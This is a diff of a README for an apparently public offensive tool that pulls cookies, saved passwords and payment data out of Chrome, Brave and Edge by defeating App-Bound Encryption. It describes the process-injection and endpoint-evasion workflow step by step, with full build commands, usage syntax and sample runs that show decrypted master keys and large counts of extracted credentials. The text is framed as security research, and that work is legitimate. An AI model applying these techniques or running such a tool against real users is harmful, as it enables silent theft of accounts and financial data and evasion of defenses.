@@ -2,35 +2,65 @@
 
 ## 🚀 Overview
 
-A proof-of-concept tool to decrypt **App-Bound Encrypted (ABE)** cookies, passwords, and payment methods from Chromium-based browsers (Chrome, Brave, Edge). This is achieved entirely in user-mode with no administrator rights required.
+![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
+![License](https://img.shields.io/badge/license-MIT-blue)
+![Platform](https://img.shields.io/badge/platform-Windows%20x64%20%7C%20ARM64-lightgrey)
+![Languages](https://img.shields.io/badge/code-C%2B%2B%20%7C%20ASM-9cf)
 
-If you find this useful, I’d appreciate a coffee:  
+A sophisticated post-exploitation tool demonstrating a complete, in-memory bypass of Chromium's **App-Bound Encryption (ABE)**. This project leverages a fileless, multi-stage injection process utilizing direct syscalls and reflective DLL injection to decrypt and exfiltrate sensitive user data (cookies, passwords, payments) from modern Chromium browsers.
+
+If you find this research valuable, I’d appreciate a coffee:  
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)
 
-## 🛡️ Background
+## 🔬 Technical Workflow
 
-Starting in **Chrome 127+**, Google began rolling out **App-Bound Encryption** to secure local user data:
+The tool operates via a two-stage process, meticulously designed to evade common endpoint defenses and achieve its objectives without requiring administrative privileges or leaving artifacts on disk.
 
-1. **Key generation**: a per-profile AES-256-GCM key is created and wrapped by Windows DPAPI.
-2. **Storage**: that wrapped key (Base64-encoded, prefixed with `APPB`) lands in your **Local State** file.
-3. **Unwrapping**: Chrome calls the **IElevator** COM server, but **only** if the caller’s EXE lives in the browser’s install directory.
+### **Stage 1: The Injector (`chrome_inject.exe`)**
 
-These path-validation checks prevent any external tool — even with direct DPAPI access — from unwrapping the ABE key.
+1.  **Initialization:** The injector starts by parsing command-line arguments and dynamically initializing a **direct syscall engine**. It enumerates `ntdll.dll`'s export table, sorts `Zw` functions by address to determine their Syscall Service Numbers (SSNs), and locates `syscall/ret` or `svc/ret` gadgets. This allows all subsequent process interactions to bypass user-land API hooking.
+2.  **Payload Preparation:** The core payload DLL is not stored on disk. It is embedded as an encrypted resource within the injector. At runtime, the injector loads this resource, decrypts it in-memory using a **ChaCha20** cipher, and prepares it for injection.
+3.  **Targeting & Injection:** It identifies the target browser process. Using the direct syscall engine, it allocates executable memory in the target (`NtAllocateVirtualMemory`), writes the decrypted payload (`NtWriteVirtualMemory`), and initiates execution via **Reflective DLL Injection (RDI)** by creating a new thread pointing to the `ReflectiveLoader` export (`NtCreateThreadEx`).
 
-## 🛠️ How It Works
+### **Stage 2: The Injected Payload (In-Memory)**
 
-**This project** injects a DLL into the running browser process using **Reflective DLL Injection (RDI)**. The RDI technique for x64 is based on [Stephen Fewer's original work](https://github.com/stephenfewer/ReflectiveDLLInjection), and for ARM64, it utilizes my method detailed in [ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection). Once injected, the DLL:
+1.  **Bootstrapping:** Once in the target's memory space, the `ReflectiveLoader` stub acts as a custom PE loader. It properly maps the DLL's sections, resolves its import address table (IAT) by parsing PEB structures and hashing module/function names, and performs base relocations. Finally, it calls the payload's `DllMain`.
+2.  **COM Hijack:** The payload, now running with the browser's own identity, connects back to the injector via a named pipe for C2. It then instantiates the browser's internal `IElevator` COM server. Because the call originates from a legitimate, path-validated process, the COM server's security checks are satisfied.
+3.  **Master Key Decryption:** The payload invokes the `DecryptData` method on the COM interface, passing it the `app_bound_encrypted_key` from the `Local State` file. The COM server successfully decrypts it, returning the plaintext AES-256 master key to our payload.
+4.  **Data Exfiltration:** With the master key, the payload discovers all user profiles, accesses the relevant SQLite databases (`Cookies`, `Login Data`, `Web Data`), and uses the key to decrypt sensitive data blobs with **AES-256-GCM**. The decrypted secrets are formatted as JSON and streamed back to the injector, which writes them to the output directory.
 
-1.  **Injector (`chrome_inject.exe`):** 
-    * The payload DLL is not stored on disk. Instead, it is **encrypted with ChaCha20** and embedded directly into the injector's executable as a resource during compilation.
-    * At runtime, the injector loads this encrypted resource into memory, decrypts it, and uses a **direct syscall engine** to perform a Reflective DLL Injection (RDI) of the payload into the target browser process.
-    * This in-memory, fileless approach completely avoids on-disk artifacts for the payload, defeating static analysis and common EDR heuristics.
-2.  **Injected Payload (In-Memory):** 
-    * Once running in the browser's address space, the payload uses its privileged position to invoke the browser's internal IElevator COM server.
-    * Because the request originates from within the trusted process, the COM server successfully decrypts the App-Bound master key.
-    * The payload then uses this key to decrypt all sensitive data (cookies, passwords, payments) across all user profiles and streams the results back to the injector.
+## 🛡️ Core Technical Pillars
 
-## 🔬 In-Depth Technical Analysis & Research
+This tool is built on several advanced, security-focused techniques:
+
+*   **Direct Syscalls for Evasion:** Bypasses EDR/AV user-land hooks on standard WinAPI functions (`OpenProcess`, `WriteProcessMemory`, etc.) by invoking kernel functions directly. The engine is robust, supporting both x64 and ARM64 by finding syscall gadgets dynamically at runtime.
+
+*   **Fileless In-Memory Payload:** The payload DLL never touches the disk on the target machine. It is stored encrypted in the injector, decrypted in-memory, and reflectively loaded, significantly reducing its signature and forensic footprint.
+
+*   **Reflective DLL Injection (RDI):** A stealthy process injection method that avoids using `LoadLibrary`, thereby evading common detection mechanisms that monitor module loads. The loader is self-contained and resolves all dependencies from memory.
+
+*   **Target-Context COM Invocation:** The critical step for defeating App-Bound Encryption. By executing code *within* the trusted browser process, we inherit its identity, allowing us to make legitimate-appearing calls to the ABE COM server and bypass its path-validation security checks.
+
+## ⚙️ Features
+
+#### Core Functionality
+- 🔓 Full user-mode decryption of cookies, passwords, and payment methods.
+- 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
+- 📝 Exports all extracted data into structured JSON files, organized by profile.
+
+#### Stealth & Evasion
+- 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
+- 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs.
+- 🤫 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
+- 👻 **No Admin Privileges Required:** Operates entirely within the user's security context.
+
+#### Compatibility & Usability
+- 🌐 Works on **Google Chrome**, **Brave**, & **Edge**.
+- 💻 Natively supports **x64** and **ARM64** architectures.
+- 🚀 Can auto-launch a headless browser process if one isn't running.
+- 📁 Customizable output directory for extracted data.
+
+## 📚 In-Depth Technical Analysis & Research
 
 For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:
 
@@ -59,17 +89,6 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
     *   Provides a comprehensive guide to interpreting COMrade ABE's output, including CLSIDs, IIDs (standard and C++ style), and the significance of verbose output details like VTable offsets, defining interfaces, and full inheritance chains.
     *   Highlights the utility of the auto-generated C++ stubs (`--output-cpp-stub`) for rapid development and research.
     *   Discusses how COMrade ABE aids in adapting to ABE changes, analyzing new Chromium browsers, and understanding vendor-specific COM customizations.
-
-### ⚙️ Key Features
-
-- 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods.
-- 🛡️ Fileless Payload Delivery: In-memory decryption and injection of an encrypted resource, leaving no DLL on disk.
-- 🛡️ Direct syscall injection engine to bypass common endpoint defenses.
-- 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
-- 👥 Support for multiple browser profiles (Default, Profile 1, Profile 2, etc.)
-- 📁 Customizable output directory for extracted data.
-- 🛠️ No admin privileges required.
-  
 
 ![image](https://github.com/user-attachments/assets/c2388201-ada9-4ac1-b242-de8f3b0d434f)
 
@@ -102,7 +121,7 @@ This project uses a simple, robust build script that handles all compilation and
 
     [INFO] Verifying build environment...
     [ OK ] Developer environment detected.
-    [INFO] Target Architecture: arm64
+    [INFO] Target Architecture: x64
 
     [INFO] Performing pre-build setup...
     [INFO]   - Creating fresh build directory: build
@@ -110,29 +129,58 @@ This project uses a simple, robust build script that handles all compilation and
 
     -- [1/6] Compiling SQLite3 Library ------------------------------------------------
     [INFO]   - Compiling C object file...
+    cl /nologo /W3 /O2 /MT /GS- /c libs\sqlite\sqlite3.c /Fo"build\sqlite3.obj"
+    sqlite3.c
     [INFO]   - Creating static library...
+    lib /NOLOGO /OUT:"build\sqlite3.lib" "build\sqlite3.obj"
     [ OK ] SQLite3 library built successfully.
 
     -- [2/6] Compiling Payload DLL (chrome_decrypt.dll) ------------------------------------------------
     [INFO]   - Compiling C file (reflective_loader.c)...
+    cl /nologo /W3 /O2 /MT /GS- /c src\reflective_loader.c /Fo"build\reflective_loader.obj"
+    reflective_loader.c
     [INFO]   - Compiling C++ file (chrome_decrypt.cpp)...
+    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\sqlite /c src\chrome_decrypt.cpp /Fo"build\chrome_decrypt.obj"
+    chrome_decrypt.cpp
     [INFO]   - Linking objects into DLL...
+    link /NOLOGO /DLL /OUT:"build\chrome_decrypt.dll" "build\chrome_decrypt.obj" "build\reflective_loader.obj" "build\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"build\chrome_decrypt.lib"
+      Creating library build\chrome_decrypt.lib and object build\chrome_decrypt.exp
     [ OK ] Payload DLL compiled successfully.
 
     -- [3/6] Compiling Encryption Utility (encryptor.exe) ------------------------------------------------
     [INFO]   - Compiling and linking...
+    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha src\encryptor.cpp /Fo"build\encryptor.obj" /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:"build\encryptor.exe"
+    encryptor.cpp
     [ OK ] Encryptor utility compiled successfully.
 
     -- [4/6] Encrypting Payload DLL ------------------------------------------------
     [INFO]   - Running encryption process...
+    build\encryptor.exe build\chrome_decrypt.dll build\chrome_decrypt.enc
+    Successfully ChaCha20-encrypted build\chrome_decrypt.dll to build\chrome_decrypt.enc
     [ OK ] Payload encrypted to chrome_decrypt.enc.
 
     -- [5/6] Compiling Resource File ------------------------------------------------
     [INFO]   - Compiling .rc to .res...
+    rc.exe /i "build" /fo "build\resource.res" src\resource.rc
+    Microsoft (R) Windows (R) Resource Compiler Version 10.0.10011.16384
+    Copyright (C) Microsoft Corporation.  All rights reserved.
+
     [ OK ] Resource file compiled successfully.
 
     -- [6/6] Compiling Final Injector (chrome_inject.exe) ------------------------------------------------
-    [INFO]   - Compiling and linking...
+    [INFO]   - Assembling syscall trampoline (x64)...
+    ml64.exe /c /Fo"build\syscall_trampoline_x64.obj" "src\syscall_trampoline_x64.asm"
+    Microsoft (R) Macro Assembler (x64) Version 14.44.35211.0
+    Copyright (C) Microsoft Corporation.  All rights reserved.
+
+    Assembling: src\syscall_trampoline_x64.asm
+    [INFO]   - Compiling C++ source files...
+    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha /c src\chrome_inject.cpp src\syscalls.cpp /Fo"build\\"
+    chrome_inject.cpp
+    syscalls.cpp
+    Generating Code...
+    [INFO]   - Linking final executable...
+    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 "build\chrome_inject.obj" "build\syscalls.obj" build\syscall_trampoline_x64.obj "build\resource.res" version.lib shell32.lib /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:".\chrome_inject.exe"
     [ OK ] Final injector built successfully.
 
     --------------------------------------------------
@@ -159,7 +207,7 @@ You can find the latest pre-compiled binaries on the [**Releases page**](https:/
 ## 🚀 Usage
 
 ```bash
-PS> .\chrome_inject.exe [options] <chrome|brave|edge>
+Usage: chrome_inject.exe [options] <chrome|brave|edge>
 ```
 
 ### Options
@@ -193,33 +241,30 @@ PS> .\chrome_inject.exe --start-browser --verbose brave
 #### Normal Run
 
 ```bash
-PS> .\chrome_inject.exe --start-browser chrome
+PS> .\chrome_inject.exe --start-browser brave
 ------------------------------------------------
 |  Chrome App-Bound Encryption Decryption      |
 |  Direct Syscall Injection Engine             |
 |  x64 & ARM64 | Cookies, Passwords, Payments  |
-|  v0.12.0 by @xaitax                          |
+|  v0.13.0 by @xaitax                          |
 ------------------------------------------------
 
-[*] Chrome not running, launching...
-[+] Chrome (v. 138.0.7204.50) launched w/ PID 23372
-[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
-[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_a98ad5d7-dcb6-4db2-a744-05c418297baa)
+[*] Brave not running, launching...
+[+] Brave (v. 138.1.80.120) launched w/ PID 26048
+[*] Waiting for DLL (Pipe: \\.\pipe\efd06328-a141-4922-b8dc-881bc08e946c)
 
-[*] Decryption process started for Chrome
+[*] Decryption process started for Brave
 [+] COM library initialized (APARTMENTTHREADED).
-[+] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Decrypted AES Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
+[+] Reading Local State file: C:\Users\ah\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State
+[+] Decrypted AES Key: 5f5b1c8112fba445332a9b01a59349f1112426753bfee2c5908aab6c46982fcd
 [*] Processing profile: Default
-     [*] 9 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
-     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
-     [*] 1 payments extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
-[*] Processing profile: Profile 1
-     [*] 136 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
+     [*] 1406 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave\Default\cookies.txt
+     [*] 1019 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave\Default\passwords.txt
+     [*] 1 payments extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave\Default\payments.txt
 [*] Decryption process finished.
 
 [+] DLL signaled completion or pipe interaction ended.
-[*] Chrome terminated by injector.
+[*] Brave terminated by injector.
 ```
 
 #### Verbose
@@ -230,42 +275,57 @@ PS> .\chrome_inject.exe --verbose --start-browser chrome
 |  Chrome App-Bound Encryption Decryption      |
 |  Direct Syscall Injection Engine             |
 |  x64 & ARM64 | Cookies, Passwords, Payments  |
-|  v0.12.0 by @xaitax                          |
+|  v0.13.0 by @xaitax                          |
 ------------------------------------------------
 
 [#] [Syscalls] Found and sorted 489 Zw* functions.
-[#] [Syscalls] Successfully initialized all syscall stubs via Tartarus Gate.
-[#] [Syscalls]   - NtAllocateVirtualMemory found at 140726530544016
-[#] Named pipe server created: \\.\pipe\ChromeDecryptIPC_1a7002a9-b8fd-4788-8e21-1a3c95f8cf41
-[#] Snapshotting processes for msedge.exe
-[#] Found process msedge.exe PID=16772
+[#] [Syscalls] Successfully initialized all direct syscall stubs.
+[#] [Syscalls]   - NtAllocateVirtualMemory (SSN: 24) -> Gadget: 0x7ffacdfd1190
+[#] Named pipe server created: \\.\pipe\9ec94252-33c6-4c39-b32b-8234e9c9f957
+[#] Snapshotting processes for chrome.exe
+[*] Chrome not running, launching...
+[#] Waiting 3s for browser to initialize...
+[+] Chrome (v. 138.0.7204.100) launched w/ PID 25984
 [#] Architecture match: Injector=ARM64, Target=ARM64
 [#] Loading payload DLL from embedded resource.
-[#] Successfully loaded embedded resource 'PAYLOAD_DLL'. Size: 1364992 bytes.
+[#] Successfully loaded embedded resource 'PAYLOAD_DLL'. Size: 1366016 bytes.
 [#] Decrypting payload in-memory with ChaCha20...
 [#] Payload decrypted.
-[#] RDI: ReflectiveLoader file offset: 0x138d0
-[#] RDI: Memory allocated in target at 0x28a070f0000
-[#] RDI: Calculated remote ReflectiveLoader address: 0x28a071038d0
+[#] Calling NtAllocateVirtualMemory_syscall...
+[#] NtAllocateVirtualMemory_syscall returned 0x0
+[#] Calling NtWriteVirtualMemory_syscall...
+[#] NtWriteVirtualMemory_syscall returned 0x0
+[#] Calling RDI::Inject()...
+[#] RDI: ReflectiveLoader file offset: 0x13bc8
+[#] RDI: Memory allocated in target at 0x22b9d310000
+[#] RDI: Payload written to target memory. Bytes written: 1366016
+[#] RDI: Memory permissions changed from 0x64 to PAGE_EXECUTE_READ (0x32).
+[#] RDI: Calculated remote ReflectiveLoader address: 0x22b9d323bc8
 [#] RDI: Waiting for remote ReflectiveLoader thread...
-[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
+[#] RDI::Inject returned true
+[#] Reflective DLL Injection succeeded.
 [#] Waiting for DLL to connect to named pipe...
 [#] DLL connected to named pipe.
 [#] Sent message to pipe: VERBOSE_TRUE
 [#] Sent message to pipe: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
-[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_1a7002a9-b8fd-4788-8e21-1a3c95f8cf41)
+[*] Waiting for DLL (Pipe: \\.\pipe\9ec94252-33c6-4c39-b32b-8234e9c9f957)
 
-[*] Decryption process started for Edge
+[*] Decryption process started for Chrome
 [+] COM library initialized (APARTMENTTHREADED).
-[+] Reading Local State file: C:\Users\ah\AppData\Local\Microsoft\Edge\User Data\Local State
-[+] Decrypted AES Key: b0334fad7f5805362cb4c44b144a95ab7a68f7346ef99eb3f175f09db08c8fd9
+[+] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
+[+] Decrypted AES Key: 3fa14dc988a34c85bdb872159b739634cb7e56f8e34449c1494297b9b629d094
 [*] Processing profile: Default
-     [*] 156 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge\Default\cookies.txt
+     [*] 371 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
+     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
+[*] Processing profile: Profile 1
+     [*] 27 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
+     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.txt
 [*] Decryption process finished.
 [#] DLL completion signal received.
 
 [+] DLL signaled completion or pipe interaction ended.
-[#] Browser was already running; injector will not terminate it.
+[#] Terminating browser PID=25984 because injector started it.
+[*] Chrome terminated by injector.
 [#] Injector finished.
 [#] Freed remote pipe name memory.
 ```
@@ -347,71 +407,20 @@ Each payment file is a JSON array of objects:
 ]
 ```
 
-## 🆕 Changelog
+## 🔗 Additional Resources & Research
 
-### v0.12.1
-- **Enhanced Profile Detection**: Made profile discovery more robust by comprehensively scanning `User Data` subdirectories for characteristic browser database files, ensuring custom-named user profiles are correctly identified and processed alongside default profiles.
-- **Critical Bug Fix / Compatibility**: Resolved crashes and improved compatibility with newer Chromium versions by gracefully handling specific 31-byte empty or placeholder encrypted blobs that previously caused `GCM blob is invalid` errors. The decryption logic now correctly interprets these as empty values instead of throwing exceptions.
-- **Improved Database Access Robustness**: Re-implemented and enhanced the `SQLite nolock=1` mechanism for accessing browser databases (e.g., Cookies, Login Data, Web Data). This ensures highly robust and stable read access to SQLite files, even when they might be concurrently locked by other processes, by leveraging SQLite's URI filename feature to bypass OS-level file locking.
+This project builds upon the work and analysis of the wider security community.
 
-### v0.12
-- **Fileless Payload Execution (Encrypted Resource Delivery)**: Migrated the payload DLL from a disk-based file to an in-memory, **ChaCha20-encrypted** resource embedded within the injector. The payload is now decrypted at runtime and reflectively injected, eliminating on-disk artifacts and defeating static analysis.
-- **Code Modernization (Full C++ Refactoring)**: Re-architected the entire codebase with modern C++ principles.
-- **Professional Build System**: Implemented a robust make.bat script for clean, reliable, and configurable local builds. 
+- **Official Documentation & Announcements:**
+  - [Google Security Blog: Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
+  - [Design Doc: Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
 
-### v0.11
-- **Kernel-Level Execution Syscall Engine (Halo's & Tartarus Gate Fusion)**: Implemented a multi-architecture syscall resolution system for improved stealth. This hybrid engine combines the strengths of multiple modern techniques:
-  - The injector first attempts a [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) approach by dynamically calculating the required System Service Numbers (SSNs) and hunting for clean, unhooked syscall stubs within ntdll.dll.
-  - In heavily monitored environments where no clean stubs can be found (as discovered on Windows on ARM64 installations), the system automatically pivots to a [Tartarus Gate](https://github.com/trickster0/TartarusGate) methodology. It directly leverages the function pointers of the (potentially hooked) Zw functions, ensuring execution continuity by passing through the EDR's hooks to the kernel.
-  - This dual-pronged strategy provides maximum stealth and operational resilience across diverse target environments on both x64 and ARM64.
-- **Stealth Enhancement (IPC)**: Transitioned from file-based IPC to **Named Pipes** for configuration and logging. `chrome_inject.exe` (server) passes a unique pipe name to the target's remote memory. `chrome_decrypt.dll` (client) uses this pipe for receiving output path configuration and for streaming log data/completion signals directly to the injector, minimizing on-disk artifacts and eliminating global named event usage.
+- **Community Research & Acknowledgment:**
+  - Proof of concept by [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)
 
-### v0.10
-- **Refactor**: Switched to **Reflective DLL Injection (RDI)** as the sole injection method, removing older `LoadLibrary` and `NtCreateThreadEx` options for enhanced stealth. (x64 RDI based on [Stephen Fewer's work](https://github.com/stephenfewer/ReflectiveDLLInjection), ARM64 RDI based on [xaitax/ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection)).
+## 🗒️ Changelog
 
-### v0.9
-- **New**: Added `--output-path` (`-o`) argument to `chrome_inject.exe` for user-configurable output directory. Output files are now organized by BrowserName/ProfileName/data_type.txt.
-- **New**: Implemented support for automatically detecting and decrypting data from multiple browser profiles (e.g., Default, Profile 1, Profile 2).
-- **CI/CD**: Integrated GitHub Actions workflow for automated building of x64 and ARM64 binaries, and automatic release creation upon new version tags.
-- **Project Structure**: Reorganized the repository into src/, libs/, docs/, and tools/ directories for better maintainability.
-
-### v0.8
-
-- **New**: **Reliable Microsoft Edge Decryption:** Implemented support for Edge's native App-Bound Encryption COM interface (`IElevatorEdge`), resolving previous inconsistencies and removing dependency on Brave Browser being installed. This involved detailed COM interface analysis and tailored C++ stubs for Edge's specific vtable layout.
-
-### v0.7
-
-- **New**: Implemented Kernel Named Events for flawless timing between Injector and DLL operations.
-- **Improved**: Major refactoring of both Injector and DLL for enhanced stability, performance, and maintainability.
-- **Improved**: Strict RAII implemented for all system resources (Handles, COM, SQLite) to prevent leaks.
-- **Improved**: More accurate and immediate error code capture and reporting.
-- **Improved**: Adaptive Locking Bypass / Enhanced Locked File Access (SQLite nolock=1 for Login Data/Payment Methods)
-- **Improved**: Dynamic Path Resolution / Dynamic Path Discovery (modern Windows APIs)
-- **Improved**: Optimized DLL's browser termination logic.
-
-### v0.6
-
-- **New**: Full Username & Password extraction
-- **New**: Full Payment Information (e.g., Credit Card) extraction
-
-### v0.5
-
-- **New**: Full Cookie extraction into JSON format
-
-### v0.4
-
-- **New**: selectable injection methods (`--method load|nt`)
-- **New**: auto‑start the browser if not running (`--start-browser`)
-- **New**: verbose debug output (`--verbose`)
-- **New**: automatically terminate the browser after decryption
-- **Improved**: Injector code refactoring
-
-Further Links:
-
-- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
-- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
-- [snovvcrash](https://x.com/snovvcrash)
-- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)
+All notable changes to this project are documented in the [**CHANGELOG**](CHANGELOG.md) file. This includes version history, new features, bug fixes, and security improvements.
 
 ## 📜 License
 
